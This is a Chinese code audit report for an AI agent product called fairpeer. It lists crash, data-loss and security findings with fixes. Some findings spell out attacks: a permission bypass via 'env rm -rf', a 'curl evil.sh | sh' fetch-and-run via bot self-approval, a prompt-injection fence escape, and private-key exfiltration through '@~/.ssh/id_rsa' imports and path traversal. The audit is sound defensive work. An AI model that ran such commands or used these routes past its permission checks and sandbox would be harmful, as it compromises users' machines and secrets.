# fairpeer 全库代码审计报告与修复 Spec

> 审计日期：2026-09-05 · 基线：分支 `feat/mindmap-read-loop`（HEAD b0d2e17d）
> 性质：**纯只读审计**。本文件是唯一新增产物，未修改任何现有代码。
> 状态标注：【已验证】= 审计者亲自复读源码确认；其余为审计 pass 中逐行阅读后报告并附代码摘录的证据。

---

## 0. 审计方法与覆盖

共 **3 轮、15 个独立审计 pass**，全部为逐行阅读源码（非抽样扫描）：

| 轮次 | 视角 | 覆盖范围 |
|---|---|---|
| 第 1 轮 | 按区域深审（11 个 pass） | `internal/agent`+`runtime`+`event`+`eventwire`+`instruction`+`experts`；`internal/tool`(a–l / m–z 两半)；`internal/netdev`(a–l / m–z 两半)；`internal/{provider,config,plugin,skill,mcpregistry,frontmatter,apihelper}`；`internal/{control,serve,memory,rag,command,scheduler,jobs,secret,sandbox,permission,hook,checkpoint,mcpdiag}`；`internal/` 其余 31 包 + `cmd/`；`desktop/*.go`；`desktop/frontend/src`（两轮共 158 文件逐行 + 190 文件机械扫描） |
| 第 2 轮 | 横切深审（3 个 pass） | 并发专项（244 处 goroutine 生成点、200 个包级变量）；安全专项（90+ exec 点、全部网络面、TLS/秘钥/反序列化/SQL/SSRF）；错误处理与资源专项（230 处吞错、58 文件句柄、21 HTTP body、226 写盘点、30 处 UTF-8 截断） |
| 第 3 轮 | 功能完整性（1 个 pass） | docs/ 82 篇文档 vs 实现；git 追踪文件卫生；版本漂移；测试盲区（1222 源文件 / 557 测试文件） |
| 第 4 轮 | 盲区全覆盖（4 个 pass） | `internal/cli` 其余 49 文件（含 chat_tui.go 4032 行全文）；trustdomain 非 nettrans 全部 + netdev/driver + netdev/transport + lsp/acp/calendar/evidence/installsource/linkpeersignal 尾部；desktop 全部平台 shim（52 文件）+ cmd 次级工具 12 个 + 根目录 Python/脚本；前端其余 75 文件（~24.8k 行）——**前端至此 100% 覆盖** |
| 第 5 轮 | 关键路径重推导 + 结论复核（1 个 pass） | 以全新视角重读 8 个最复杂文件（agent 回合环、edit_fuzzy、browser 会话、proposal 状态机、config 渲染、scheduler、controller gate、stdio JSON-RPC）；并对前 4 轮全部 48 项 P0/P1 结论逐条回到源码独立复核 |

**规模**：约 25 万行（Go ~17 万 + TS/TSX ~8 万）。五轮累计逐行覆盖约 99% 非测试源码（残留：`components/mermaidLogic.ts` 尾部、`entityTypes.ts` 尾部常量、`spike/stt` 正文）；测试代码仅按需抽查。
**验证**：P0 全部 4 项 + P1 中 10 项由主审计者亲自复读源码复核；第 5 轮再对 48 项 P0/P1 逐条独立复核——**46 项确认、0 项推翻、2 项仅修正行号**（实质均成立）。

### 问题总览

| 严重级 | 定义 | 数量 |
|---|---|---|
| **P0** | 可从正常使用/外部输入触发的崩溃、数据损毁、无审批任意命令执行 | **4** |
| **P1** | 主路径真实 bug：功能性失效、静默数据丢失/破坏、真实安全绕过 | **~60**（第 4/5 轮新增 12） |
| **P2** | 边界条件 bug、并发/资源缺陷、质量隐患 | **~120** |
| **P3** | 低危缺陷、死代码、可维护性 | **~130** |

子系统分布（P0+P1）：核心 agent/会话 10 · 工具 8 · netdev 15 · provider/config/plugin 8 · control/serve/rag/scheduler 8 · bot/移动桥/信任域 6 · desktop Go 后端 9 · 前端 4（P0 1 + P1 3）。

---

## 1. P0 —— 必须立即修复（4 项）

### P0-1【已验证】权限系统将 `env` 归类只读 ⇒ 无审批任意命令执行
- **位置**：`internal/permission/bash_readonly.go:16`（白名单）、`:97-111`（`hasUnsafeReadOnlyArgs` 无 `env` 分支）
- **问题**：`isReadOnlyBashSubject("env rm -rf /important")` → 无 shell 元字符、`base=="env"` 在白名单、参数检查无 `env` 用例 → 判定只读。`Gate.Check` 提升 `readOnly=true` 后 `DecideSubject` 直接 `Allow`——默认 ask 模式下**不经提示、不经沙箱**执行任意 argv（`env` 即元执行器）。同类还有 `find -fprint/-fprintf/-fls`（写文件但只检查 `-exec/-delete`，`bash_readonly.go:99`）、`git tag v1 -d x`、`git reflog delete`（`bash_readonly.go:32-39` 把 tag/reflog 列入只读子命令）。
- **影响**：LLM 输出即攻击面；提示注入可直接落为无审批主机操作。
- **修复**：`env` 仅在 `len(args)==0` 或首参匹配 `NAME=VALUE`/`-i/-0/-u` 时只读；`find` 补 `-fprint*`/`-fls`；`tag`/`reflog` 移出只读集合（或要求无参）。为 `env/nohup/xargs/timeout/stdbuf/nice/setsid` 等元执行器逐个补单测（当前该文件有测试但未覆盖这些形状）。

### P0-2【已验证】`repeatSuccessCounts` 并发 map 读写 ⇒ 进程级 fatal crash
- **位置**：`internal/agent/agent.go:1967`（读）、`:1982-1984`（写）
- **问题**：writer 批次按"预览路径不相交"分批并行（`partitionToolCalls` agent.go:1585-1619），`executeOne` 在 `runParallel` 中并发执行。模型在同一轮发两个不同文件的 `write_file`——**常规行为**——两个 goroutine 即可同时进入 `recordRepeatSuccess`。Go map 并发读写是 `fatal error: concurrent map read and map write`，**不可 recover**，整个进程退出。
- **修复**：给 `repeatSuccessCounts` 加 mutex（参照 `opGate` 的做法 op_gate.go:222），或换 `sync.Map`。补一个并发 writer 批次的 race 测试。

### P0-3【已验证】Bot 白名单默认全开放：任意 IM 用户自动入群并**可自批准工具执行**
- **位置**：`internal/bot/gateway.go:425-436`（自动加入+继续执行）、`:502-512`（`checkAllowlist`）；默认配置 `internal/config/config.go:1585`（`Enabled:true` 但用户列表空、`Mode` 空）
- **问题**：默认配置下任何发来首条消息的用户落入"开放模式"分支：自动加入白名单（并持久化）、**同一条消息立即执行**。入群后即可调用 `/desktop approve <id>`（desktop.go:123，远程批准桌面实时会话的工具审批——整个 human-in-the-loop 闸门）、`/netdev 变更 批准 <编号>`（netdevcmds.go:164-180）、`/approve <id>`。群白名单在未配置任何群时被 `len(groups) > 0` 静默跳过。**攻击路径**：知道 bot 用户名的任何人 → 发"运行 curl evil.sh | sh" → 代理提议 bash 工具 → 攻击者 `/approve` → 用户主机完整代码执行。
- **修复**：默认 `Mode="review"`；自动入组的消息本身绝不执行；群聊必须显式配置群白名单才响应；`/desktop approve`、`/netdev 批准`、`/approve` 增加独立 admin 用户列表校验。

### P0-4【已验证】前端 hooks 规则违反：Ctrl/Cmd+I 打开代理面板即白屏
- **位置**：`desktop/frontend/src/components/AgentDashboard.tsx:26-28`
- **问题**：`useState` 之后 `if (!open) return null;` 再 `useMemo`。组件在 App.tsx:4000 无条件挂载，首渲染 `open=false` 只调 1 个 hook；切 `open=true` 时 hook 数变 2 → React 抛 "Rendered more hooks"，顶层 ErrorBoundary 清空整棵树。
- **修复**：`useMemo` 移到 early return 之前（或用 `open && <JSX/>` 门控渲染而非门控 hooks）。

---

## 2. P1 —— 主路径真实 bug（按子系统分组）

### 2.1 核心 agent / 会话（10 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| A1 | `internal/agent/interceptors.go:97-102`（agent.go:904-907 到达） | 截断拦截器只持久化 `RoleTool` 消息就 `continue`，携带 `tool_calls` 的 assistant 消息尚未落盘（:913-919） | 会话历史出现孤儿 tool 结果；OpenAI 400 / Anthropic 拒绝，**本轮后续所有调用硬失败**且坏顺序被持久化 | 先持久化 assistant 消息再进拦截器 |
| A2 | `internal/event/itemadapter.go:19-27,54-63` | `ItemAdapter` 无锁持有 `seq/currentAgentMsg` 状态，`agent.New` 把它包在 `event.Sync` **之外**；后台 task job 与并行 writer 批次均并发 Emit | 事件 ID 错乱、delta 配对损坏（UI 渲染串台） | adapter 内加 mutex，或在 `agent.New` 内包 `event.Sync` |
| A3 | `internal/agent/compact.go:219` + `internal/control/controller.go:1124-1127` | `/compact` 绕过 `runGuarded` 在独立 goroutine 跑，`compact` 无锁读 `session.Messages`（裸 3 字 slice header 读） | 与在飞 turn 的加锁 Add 竞争 → 撕裂 slice → OOB panic / 历史损坏 | compact 用 RLock 快照读取；`/compact` 在 `Running()` 时拒绝或排队 |
| A4 | `internal/agent/task.go:246` + `worktree.go:77` | worktree 创建后 `WorkDir()` **全仓库无调用方**——子代理实际仍在主工作区跑；`wt.Diff()` 对空 worktree 做 diff，模型被告知"子代理在隔离 worktree 且未改文件"（**对模型撒谎**）；后台路径 `defer wt.Cleanup()` 在 job 运行中就销毁 | "并行子代理不写同一文件"的承诺不存在；诊断信息失真 | 把 worktree 路径穿进子代理工具构建；或删特性并改掉误导文案 |
| A5 | `internal/control/controller.go:2104-2110` + `internal/checkpoint/checkpoint.go:495-502` | 会话回退重编 turn 号，但 checkpoint Store 无截断 API，同 Turn 出现两条记录；`sort.Slice` 非稳定 → `RestoreCode`/`SuffixInfo`/`DiffForTurn` **非确定性**选取新旧快照 | 回退后代码恢复不可预测；陈旧 turn 仍列出 | 增加 `Store.TruncateFrom(turn)`（删除 done 条目+文件）并在 Rewind/forkNamed 调用 |
| A6 | `internal/control/controller.go:574-577` vs `3396-3404` | `Close()` 的 `autosaveWG.Wait()` 与后续 follow-up turn 的 `wg.Add(1)` 竞争（计数归零后 Add）；新 turn 还能在 `cleanup()` 之后写已拆除的控制器 | 关闭时 panic 或孤儿 turn | `runGuarded` 在 `c.mu` 下检查 `closed` 标志；Close 持有一个 wg 名额直至完成 |
| A7 | `internal/control/controller.go:1905-1937` | NewSession/ClearSession 在 running 检查与 swap 之间有窗口，follow-up submit 可切入并向将被替换的 session 追加 | 会话记录撕裂（注释声称不会发生的正是这个） | swap 临界区内复查 running；或 runGuarded 注册 turn 与检查同一临界区 |
| A8 | `internal/agent/save.go:62-64` | 会话 HMAC 密钥：单次 `UnixNano()` 采样的 8 字节循环重复 4 次填满 32 字节 | 离线按时间戳暴力破解可行；会话签名形同虚设 | `rand.Read(k)`（文件已 import crypto/rand） |
| A9 | `internal/agent/dream.go:374-396` vs `save.go:505-512` | `workspaceOldEnough` 只扫顶层 `*.jsonl`；会话自 2026-08-21 起存 `<dir>/<id>/<id>.jsonl` | 全新安装 `ShouldAutoDream/Distill` **永不触发**（静默失效） | 像.ListSessions 一样下钻一层子目录 |
| A10 | `internal/control/controller.go:1636,1767-1796` | `newInteractiveGate` 无锁读 `c.policy`（与 SetPlanMode 写竞争）；且 `SetPlanMode` 从不调 `refreshInteractiveGate()`——plan 模式的 HardDeny "数据层保证"在活路径上是**死代码** | plan 模式仅靠运行时布尔兜底 | 读 policy 前取 `c.mu`；SetPlanMode 末尾刷新 gate |

### 2.2 工具（internal/tool，8 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| T1 | `builtin/screen_windows.go:560-570` | Win64 `INPUT` 结构联合体被写到 offset 4（正确 8）：整体拷贝后只改 `in[0:4]` 类型字段 | **x64 上所有 SendInput 静默失效**——screen_click/key/scroll/type 全部发出无操作；仅 moveMouse（SetCursorPos）可用并掩盖了问题 | 联合体字节拷到 `in[8:]`、类型放 `in[0:4]`；补 sendInput 集成测试 |
| T2 | `builtin/untrusted.go:62-81` | 围栏消毒器用 `ToLower` 副本的字节偏移切割**原串**；`İ`(U+0130)/`K`(U+212A) 等使 ToLower 变长时偏移错位，注入 ≥19 个该类字符即可让 `</untrusted_content>` 完整存活而扫描器自以为已消费 | 这是仓库自述的"针对提示注入的**唯一**防线"（web_fetch/web_search/RAG/浏览器输出全走它）——围栏逃逸即提示注入成立 | 在原串上做大小写不敏感定位（`(?i)` regexp FindStringIndex），绝不用变换后副本的偏移切原串 |
| T3 | `builtin/screen_windows.go:240-264` | `screenshot` 只读免审批，region `{w,h}` 来自 LLM 参数且无屏幕边界钳制：`w=h=100000` → `make([]byte, 4e10)` ≈ 80GB 分配 → fatal OOM（recover 救不了） | 一次工具调用杀死进程 | 钳制 region 到屏幕范围并拒绝超限 |
| T4 | `builtin/browserflow.go:955` | flow `type` 步骤传 `target` 键，但 `browserType.Execute` 只解 `ref/selector` → 落到 `document.activeElement` | 录制回放把文本打进恰好聚焦的元素——浏览器自动化主路径错乱 | `target` 映射为 `ref/selector`（与 select/upload 分支一致） |
| T5 | `builtin/edit_fuzzy.go:275-284,441-466` | 行修剪匹配把 old 的首行匹配到内容行**中段后缀**，`mapTrimmedToOriginal` 返回整行区域；editfile.go:96 的逐字子串守卫放行 | `strings.Replace` **删掉 old_string 之外的文本**（静默破坏用户文件） | 只接受起止都在修剪行边界的匹配 |
| T6 | `builtin/apply_patch.go:495-503` | `Update File` + `Move to:` 同路径：先写新内容再 `os.Remove(path)` | LLM 生成的 patch 可把文件**删没**且报成功；回滚路径还会删除已存在的目标文件 | Phase 1 拒绝 `Clean(movePath)==Clean(path)` |
| T7 | `builtin/rag.go:698-707` | `rag_mindmap` 是唯一无 `roots` 字段、不调 `confine` 的写入工具（ConfineWriters 与 Workspace 覆盖都漏掉它） | `atomicWriteBytes` 可覆写任意用户可写文件，绕过 `[sandbox] workspace_root` | 加 roots + confine，并加入 ConfineWriters |
| T8 | `builtin/docxtemplate.go:267-271` vs `docxread.go:352-363` | `paragraph_replace` 不把 `<w:p/>` 计为段落，doc_read 计（docxwrite.go:962 自己就会产出 `<w:p/>`） | 模板填段索引错位，**内容静默拼进错误段落** | 接受 `afterTag[0]=='/'` 为段落（计数但跳过替换） |

### 2.3 netdev（15 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| N1 | `internal/netdev/dbquery.go:295` | `redisQueryAllowed("slowlog")`：fields=["slowlog"] 匹配 `args==-1` 后直接 `fields[1]` | agent 工具一次调用即 **panic 崩进程**（在飞扫描/任务/cutover 全丢）【已验证】 | 补 `len(fields) < 2 ||` 守卫 |
| N2 | `internal/netdev/proposal.go:112,682,903,974` | `done → watching` 转换**不存在**（全仓库无生产代码写 `ProposalWatching`，grep 证实） | §7.1 观察期整套特性死代码：30 分钟自动关闭 goroutine 永不命中、`CloseProposalWatch` 恒报错、劣化检测与 critical Finding 永不触发【已验证】 | 执行完转 watching（或首轮健康扫描时转），或让三个消费方接受 `done`+`WatchUntil` 未来 |
| N3 | `internal/netdev/proposal.go:642-657,752-756` | 步内第 N 条命令失败即整步 `Applied=false`，`RollbackProposal` 跳过该步——但前 N-1 条**已在设备上生效**。同根因波及 `execSQLMigration`（已提交语句不回滚）与 `execCertReplace`（证书/密钥不成对残留） | 半套用变更永久残留且无回滚路径 | 记录步内已执行前缀（AppliedCount），失败也回滚前缀 |
| N4 | `internal/netdev/locate.go:138-142` | 仅当命令串以 target 结尾（华为/思科 `| include`）才解析输出；zte/linux/windows 走"客户端匹配"但 `lines` 恒 nil | `netdev_locate`（"这个 IP 在哪个口下"）对这些设备**永远零命中**【已验证】 | 无条件 `lines = strings.Split(r.Output, "\n")`（matchLocateLines 本就过滤） |
| N5 | `internal/netdev/assess.go:223-229,127-128` | 设备不可达（传输错误）与"凭据被拒"返回同值；循环结束后 `Weak==false` 触发 `resolveWeakCredFinding` | **已确认的弱口令 critical Finding 被自动改为"复核通过，已恢复"**——设备只是恰好离线 | 区分"不可达/结论未知"；仅全部尝试均为真实认证拒绝才 resolve |
| N6 | `internal/netdev/syslogrecv.go:72-80` | 停用路径 Close 后不置 `syslogConn=nil`；重启路径 `current != nil` 直接 return | 关→开后 syslog **静默死亡**且状态仍报 listening；端口变更需重启（与 trap 接收器行为不一致） | Close 时置 nil（持 syslogMu）；端口变化走 stop+start |
| N7 | `internal/netdev/traprecv.go:71-131` | 注释声称"逐 trap 校验 community"，实际 gosnmp TrapListener 只解析不比对，`trapHandle` 也不读 `p.Community`（对照 v1.38.0 源码证实） | 任意可达主机可伪造源 IP 注入 linkDown/coldStart trap，制造假 Finding 误导值班 | trapHandle 比对来源设备配置的 community，不匹配丢弃并记审计 |
| N8 | `internal/netdev/srvconf.go:187-196`（连带 template.go:141、proposal.go:196） | `SrvConfText(id)` 未消毒的 id 进 `filepath.Join`；id 经代理起草的 `RestoreVersion` 字段流入；执行时文件内容还会 `sshB64Upload` 到"staging 设备" | `../secrets.enc` 读出密文再上传——**secret 外带通道** | 强制 `filepath.Base(id)==id` + `^sc@…@[0-9a-f]{12}@[0-9]+$` 白名单 |
| N9 | `internal/netdev/probelog.go:79-97` | `ls -d` 输出（单字段、`/` 开头）被按 `ls -lh` 格式（权限位开头、≥2 字段）解析 | `probeAppLogDirs` 永远返回空——特性死代码 | 改 `ls -ld <globs>` 或按行解析 `ls -d` |
| N10 | `internal/netdev/triage.go:192-203` | GPU 温度正则锚定行尾取 `mm[2]`——那是 memory.total；且 `--format=csv` 默认带单位，`(\d+)$` 永不匹配 | GPU 85℃ 告警**永不触发**（静默失效） | 按列分割 CSV 取 index 2 + `csv,nounits` |
| N11 | `internal/netdev/dashboards.go:250` | 调查链回退条件 `!f.CreatedAt.After(cutoff)` 反了（对照 :268 正确写法） | 案件链由**最旧**的 20 条构成，或全部新 finding 时为空 | 去掉 `!` |
| N12 | `internal/netdev/layerdiscover.go:342-373` | 错误出口（dial 失败/CIDR 非法）保持 `run.Status=="running"` 落盘 | 幽灵 running：`DiscoverResume` 永远拒绝，看板卡死 | 错误出口设 failed 状态 |
| N13 | `internal/netdev/proposal.go:553-575,662-664` | 执行中途进程崩溃/SaveProposal 失败 → 永远停在 `executing`（approve/execute/rollback/delete 全不接受该状态） | 只能手改 JSON 解锁 | 启动时把陈旧 executing 归档为 partial 并加"需人工核对设备"注记 |
| N14 | `internal/netdev/statehist.go:360` | 状态回退不把 `partial` 视为活实体（DeleteProposal 明确保护 partial，因其存有恢复用 Backup） | 回退删除 partial 提案文件 → **设备上的变更失去回滚依据** | stateLiveEntities 加入 partial |
| N15 | `internal/netdev/tools.go:313` 等 | 被拒命令原文（未走 Redact）进审计 `audit.jsonl`，`selfexport.go:63` 再导出 | `snmp-agent community read MyS3cret` 这类含密拒绝原文落盘并被导出 | 审计前对命令文本统一 Redact |

（P2 级 netdev 补充：`proposal.go:945` 恢复的设备被判劣化 → 假 critical 回滚建议；`timeline.go:71` 全设备视图丢 syslog/trap；`proposal_steps.go:496` 单引号包裹可被 `'` 破注入；`nmaporch.go:93/netprobeorch.go:63` IPv6 绕过主机预算；`job.go:335` pauseReq 双 close；`logfollow.go:229` done 值被消费 → 永久泄漏；`discover.go:250` 层扫描结果双记来源错；~~`auditanchor.go:85` 审计锁内做网络 RPC 拖慢一切~~【第 6 轮证伪：AnchorAudit→Node.Propose 是纯本地操作（签名+内存追加+本地落盘），仅 quorum 路径才联系 peer，无网络阻塞；成立的部分只是锚定在 auditMu 内做有界的本地工作】；`auditproject.go:328` 零风险项目永不能放行；`humantty.go:142` stdout/stderr 无锁共用解码器；`cutover.go:589` 中止 TOCTOU；`discovered.go:73` IP 直拼文件路径可穿越删除。）

### 2.4 provider / config / plugin（8 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| C1 | `internal/config/render.go`（`RenderTOMLForScope`） | 手写 TOML 渲染器丢字段：`[llm]` 只写 rpm 丢 `reserve_main`（boot.go:324 实际消费）；`[bot.allowlist]` 丢 telegram_users/groups；session_mappings 丢 chat_type/chat_id；丢 `desktop_watchers`、`dream.skill_cold_days/idle_minutes`、`[cowork]` 的 rag_enabled/vlm_model/extract_*/he_port/browser_*(6 字段)/browser_headless/user_data_dir/attach_url | **每次保存配置即静默丢弃这些设置**（render.go:561 自己记载过同类"保存成功但没存上"事故）【已验证 reserve_main】 | 各节改用 `toml.NewEncoder` 整节序列化（netdev/trustdomain 已是此写法）；补"渲染↔解码字段一致性"守卫测试 |
| C2 | `internal/plugin/transport_sse.go:161-180` | `for ep == ""` 内 select 带 `default`（非阻塞），读一次 endpoint 后仍空就**立刻返回错误**——循环永不再迭代 | 所有 `type="sse"` MCP 插件 initialize 与 endpoint 事件赛跑，**间歇性/必然启动失败**【已验证】 | 用 endpoint 就绪 channel 阻塞等待 |
| C3 | `internal/config/config.go:1749-1757` + `mcpjson.go` + `boot.go:866` | 工作区 `.mcp.json`（克隆仓库自带）在 Load 时并入 cfg 并被 AutoStart 直接 spawn stdio 命令——**无任何首次使用确认门**（对照 Claude Code 同格式需批准） | 克隆恶意仓库 = 启动即执行任意命令 | 标记 .mcp.json 来源条目，首次 spawn 前要求持久化的用户确认 |
| C4 | `internal/config/config.go:2396` | `WriteFile` 裸 `os.WriteFile` 非原子（对照 SaveTo 用 ReplaceFile）——desktop/mobilebridge 多处与 migrate 走此路径 | 崩盘/满盘时 fairpeer.toml（含 provider key）**截断丢失**【已验证】 | 改 `fileutil.AtomicWriteFile` |
| C5 | `internal/provider/openai/openai.go:295-308` | `vision=false` 时注释声称"剥离图片"，实际 else 分支原样透传 `image_url` parts（`ModelSupportsVision` 全仓库仅 1 个调用点） | 纯文本模型收到图片 → 400；config.go:1203 的契约未兑现 | else 分支替换为纯文本 parts |
| C6 | `internal/provider/openai/openai.go:582,599-603` | ① `Temperature float64 omitempty`——**temperature=0 无法表达**（确定性需求失效）；② `chatJSONSchemaFmt.Strict` 从不置 true | 受约束输出实为非强制提示 | ①改 `*float64`；②满足全严格条件时置 `strict:true`（配合 CanonicalizeSchema） |
| C7 | `internal/frontmatter/frontmatter.go:32-58` | 只支持单行 `key: value`；`description: >`/`|`/续行被解析为空 | **多行描述的 skill 从模型索引中消失**（skill.go:482 仅警告） | 空值 key 后折叠消费更缩进行 |
| C8 | `internal/plugin/plugin.go:1188-1204` | `parseToolResult` 丢弃全部非 text 内容块（image/audio/resource_link），无任何标记 | 模型看到空结果且不知原因 | 每个丢弃块追加 `[非文本内容 <type> 已省略]` |

（P2 级补充：http/sse 传输无视 `CallTimeout`——挂死远端 MCP 无限阻塞回合；`readBoundedLine` 先整行缓冲再查上限——16MiB 防护形同虚设；`migrateLegacyMCPTiersFile` 文本级改写可能吞掉多行字符串中的 `tier` 行；Anthropic 无中途重连、不产出 `StreamInterruptedError`；MCP HTTP OAuth 全套实现**零接线**。）

### 2.5 control / serve / rag / scheduler / permission / sandbox（8 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| S1 | `internal/serve/serve.go:243-257,261-264` | CSRF 仅靠 Content-Type 检查——DNS rebinding 页面可同源 POST `/submit`、`/bypass`（开 YOLO）、`/approve`；`Run()` 无任何 server 超时；全 serve 无 `MaxBytesReader`、无限速 | 本地 HTTP API 可被浏览器页面驱动为"代理 RCE" | 校验 Host/Origin；包 MaxBytesReader；server 加超时 |
| S2 | `internal/serve/serve.go:722-741` | `POST /resume` 的 `body.Path` 未验证即 `agent.LoadSession` | 任意路径文件被当会话解析，内容经 `/history` 外泄（与 S1 组合成任意文件读） | 按 `deleteSession`（:919）的方式做目录约束 |
| S3 | `internal/rag/store.go:920-933` | `RenameCollection` 对 `rag_chunks` 做 `SET collection=...`，但该表无 collection 列；exact 分支 `return err` 整体回滚 | **重命名集合永远失败**（RagRenameCollection 报错）【已验证】 | exact 列表移除 rag_chunks（其按 job_id 键） |
| S4 | `internal/rag/entities.go:1282-1296,1212` | 首行空 embedding blob 时 `dims=0` 先 append meta 后续行补 dims → `vecs[i*dims:(i+1)*dims]` 错位 | 向量搜索 **slice OOB panic** | `len(vec)==0 { continue }` 前置 |
| S5 | `internal/scheduler/scheduler.go:394-428,766,856` | 运行中任务 NextRun 不前移，期间任意 Create/Update/Start 触发 `armNextTimerLocked` 以 0 延迟再发射**同一任务并发双跑**；且 5 域 cron 的 `runsPerDay` 返回 0 → **绕过 max_runs_per_day 上限**（`*/1` 1440 次/天放行） | 双份 agent 运行/双份通知；失控循环守卫对最强语法失效 | in-flight 标记 + fireDue 跳过；按 24h 窗口实际求值 cron 次数 |
| S6 | `internal/sandbox/seatbelt_other.go:16-27` | 非 darwin 路径无视 `Spec.RequireAvailable`：Linux/Windows `enforce` 且无 bwrap 时**静默裸跑**（darwin 路径正确 fail-closed） | enforce 沙箱承诺在 2/3 平台不存在 | 镜像 darwin 行为；bash 工具对 nil argv 拒绝 |
| S7 | `internal/memory/doc.go:210-235,258-269` | `@import` 支持绝对路径与 `~` 展开，内联结果进系统提示词 | 恶意仓库 AGENTS.md 写 `@~/.ssh/id_rsa` → 私钥进每次请求的 prompt（**外带通道**） | 仅允许导入文件目录下的相对路径 |
| S8 | `internal/control/controller.go` + `internal/checkpoint/checkpoint.go:439-454` | checkpoint 裸写非原子（crash 截断被 load 静默跳过 → 该 turn 快照全失）；`KeepCurrent` 锁内算号、锁外 Begin——并发同号互覆 | 回退"看似成功"实际丢 turn | tmp+rename；号分配与 Begin 原子化 |

（P2 级补充：`rag/llm_semantic.go:341` 声称有界实则无界缓存；`rag/extract.go:167` Stop 后永不能重启；`permission.go:566` "总是允许"持久化裸工具名（对 bash 即全放行）；`scheduler/expr.go:412` DST 漂移 ±1h；`serve` /sessions 同步逐文件 LLM 起标题。）

### 2.6 bot / 移动桥 / 信任域 / 信号服务（6 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| B1 | `internal/mobilebridge/bridge.go:379-384` | `NewConn` 错误路径 `b.mu.Unlock()`——锁早在 ：308 已释放 | 入站 offer goroutine 中 `sync: unlock of unlocked mutex` **panic 崩进程**【已验证】 | 删该 Unlock |
| B2 | `internal/mobilebridge/signal_client.go:129-137` | 默认 `wss://` 信令 URL 被静默降级为 `ws://`（只识别 https 前缀） | SDP（含本地 IP）、配对公钥、WS 鉴权签名全部明文 | wss→wss、https→wss、http→ws |
| B3 | `internal/trustdomain/nettrans/serve.go:97-107` | `kindGetBlocks`：`m.From>m.To` 未查，`blocks[10:3]` 于处理 goroutine panic（无 recover） | 已认证 peer 一条消息**崩掉整节点**【已验证】 | `From>To||From>h` 时回空 |
| B4 | `internal/cli/trustdomain.go:615` | `tdRun` 主 goroutine `Tick()`（Append/换 chain）与 Serve 处理 goroutine 并发读 `Chain()`——Chain 零同步 | 数据竞争 → concurrent map fatal / 撕裂状态 | Tick 串行化进 Serve 循环或加锁 |
| B5 | `internal/mobilebridge/command_router.go:215-218` | `set_plan` 分支内 `env.T=="set_plan"` 恒真 → 只能开 plan **永远关不掉**（注释自认 placeholder） | 手机端 plan 模式单向锁死 | wire 类型加布尔并解析 |
| B6 | `internal/linkpeersignal/server.go:49-81` | XFF 取**最左**表项 + `strings.HasPrefix(host,"172.")` 信任全部 172/8 | 追加式代理下伪造 XFF 绕过 IP 限速；公网 172.x 直连亦被当可信代理 | 取最右表项；`net.ParseIP+IsPrivate/IsLoopback` 判定 |

（P2 级补充：Feishu webhook 无时间戳防重放、`==` 比较 token、默认绑 0.0.0.0；QQ 网关 `NewTicker(server 值 0)` panic；weixin 全部 API 用无超时 DefaultClient；`remotehost` 预鉴权行无上限读 + session/new TOCTOU 泄漏控制器；`browserlaunch.StartTracked` 实际裸 `cmd.Start()`——Windows Job Object 从未挂上，硬退出泄漏 Chrome 进程树；bot 群 allowlist 未配置群时被静默跳过；prewarm 会话忽略平台覆盖。）

### 2.7 desktop Go 后端（9 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| D1 | `desktop/tabs.go:3061-3092` | `DeleteTopic` 调 `loadTopicTitles` 不传 profileKey（读 dev 桶；RenameTopic 正确传参） | cowork/netdev 主题**删不掉**（topic not found）；`TrashTopic` 在移文件后才调它 → 整个回收站流程报错、树悬挂【已验证】 | 三处 load 均传 profileKey；TrashTopic 中先删主题 |
| D2 | `desktop/loop_engine.go:342` | 验证失败回滚 = 项目根 `git checkout -- .`，无事先快照 | **清掉用户全部未提交改动**（verify 命令手误/测试抖动即触发）【已验证】 | 回合前做快照（stash create / 临时 ref / checkpoint 包），回滚到快照 |
| D3 | `desktop/bot_connection_app.go:203-210` | Telegram token 只 `os.Setenv` 不 `upsertCredential`（对照 Feishu 路径 :377 有持久化） | 重启后 bot 连接失效需重新粘贴 | 验证成功后 upsert；失败路径 Unsetenv |
| D4 | `desktop/rag_app.go:1385-1417` | `GetDocumentPreview` 对任意绝对路径直接读全文（兄弟方法都有校验） | 前端被攻破即任意文件读，且内容会进 LLM 请求 | 校验 docPath 属于 RAG store 注册路径/导入根 |
| D5 | `desktop/app.go:6233-6246` | `withActiveWorkspaceDo` 全进程 `os.Chdir` 无锁——拖拽+粘贴并发即可交错，defer 恢复错目录 | 所有 cwd 相对操作（config.LoadForRoot(".") 等）静默指向错误工作区 | 删 Chdir，显式传 root（下游已支持） |
| D6 | `desktop/settings_app.go:764-785` | `SetDefaultModel` 无锁读写 `tab.model`（其余路径全在 a.mu 下） | 与 saveTabsLocked 竞争，持久化撕裂值 | a.mu 下快照/恢复 |
| D7 | `desktop/expert_runs.go:313-315` | `waitForExpertTab` 等 readyCh 后 `a.tabs[tabID].Ctrl` 不查 nil | tab 已关时 goroutine panic → **整个桌面应用退出** | 先查表再取 Ctrl（仿 recordReadTelemetry） |
| D8 | `desktop/loop_engine.go:128-135` | 并发 `LoopStart` 双启动；先结束者 `setLoopRun(nil)` 清掉对方的运行状态 | LoopStop 失效，孤儿循环持续烧 token | CAS 式占位 + defer 校验所有权 |
| D9 | `desktop/app.go:6297-6315` | `SaveExportFile` 接受任意路径任意内容 `os.WriteFile(0o644)` | 被攻破 webview 可任意写文件（含自启动位置） | 只允许 PickExportFile 返回过的路径（token 化） |

（P2 级补充：post-swap 读 tab.mode/ragScope/goal 未持锁；`remote_session.go:422` `SetAutoApproveTools(false)` 是空操作（YOLO 只能开不能关）；`remote_host_manager` 裸赋值 + links 无锁读 + 双拨号泄漏宿主进程；mobilebridge 5 个设置写绕过 `configApplyMu`；6 个 netdev 绑定用无超时 `context.Background()`；`remote_server` TLS=false 明文推 API key / TOFU 首连钉证无提示；bridge.ts 声明的 `BrowserConsoleBack/Forward/ExtractTable` 三个绑定 Go 端不存在。）

### 2.8 前端（P0-4 之外 3 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
